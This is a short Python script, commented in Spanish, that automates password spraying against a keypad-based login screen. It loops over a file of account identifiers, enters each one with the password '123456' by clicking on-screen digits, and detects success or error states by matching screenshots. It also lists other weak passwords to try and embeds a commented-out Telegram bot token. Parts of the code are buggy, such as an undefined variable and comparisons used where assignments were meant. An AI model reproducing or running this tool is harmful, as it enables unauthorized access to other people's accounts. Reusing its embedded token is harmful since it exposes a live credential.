import pyautogui 
import time
import telegram

#bot_token = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
#chat_id = '1850445278'
#bot = telegram.Bot(token=bot_token)
# pyautogui.displayMousePosition()
posicionError = 1585, 608 #Color (255,120,0)
donde_escribir = 1735,209
lugar_clave = 1616,383
boton_siguiente = 1632,488
linealote = 0

#posibles_contras 
#123456
#111111
#555555
#222222
def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)

def buscarnumero(numero):
	image = str(numero) + '.png'
	time.sleep(0.1)
	#flag = True
	loc = None
	while loc is None:
		loc = pyautogui.locateOnScreen(image, grayscale=True, confidence=0.9)
		#print(loc)
		if loc == None:
			time.sleep(5)

	pyautogui.moveTo(loc)
	pyautogui.click()
	#print (loc)
def borrar():
	for i in range (1,17):
		pyautogui.press('backspace')

with open ('./lote.txt') as texto:
	for x in texto:
		linealote += 1

		click(donde_escribir)
		borrar()
		pyautogui.typewrite(x)
		click(lugar_clave)
		time.sleep(1)

		#calando del 1 al 6
		for j in range (1,7):
			print(x)
			print("Intentando '123456' ")
			print("***************")
			buscarnumero(j)
			#print(j)
		time.sleep(0.5)
		click(boton_siguiente)
		#Confirmacion
		errores = "nonu"
		contador = 0
		while errores == nonu:
			print("Verificando...")
			image_error = "Error0404.png"
			image_error2 = "Error0428.png"
			image_error3 = "Error0002.png"
			image_erroe4 = "Error0432.png"
			time.sleep(2)
			prueba = pyautogui.locateOnScreen(image_error, grayscale=True, confidence=0.9)
			if prueba != None:
				errores == "sipi"
			prueba = pyautogui.locateOnScreen(image_error2, grayscale=True, confidence=0.9)
			if prueba != None:
				errores == "sipi"
			prueba = pyautogui.locateOnScreen(image_error3, grayscale=True, confidence=0.9)
			if prueba != None:
				errores == "sipi"
			#Por si es buena :
			image_buena = 'Buena0406.png' # Contra incorrecta pero live
			prueba = pyautogui.locateOnScreen(image_buena, grayscale=True, confidence=0.9)
			if prueba != None:
				errores == "sipi"

			Correcta = 'AccesoCorrecto.png'
			entrado = pyautogui.locateOnScreen(image_buena, grayscale=True, confidence=0.9)
			if entrado != None:
				print("Contra: 123456")
				pyautogui.alert("Acceso Exitoso")
				time.sleep(10)
			if prueba == None:
				time.sleep(3)

			contador += 1
			if contador == 10:
				break 
			print("Verificados!")
		time.sleep(3)



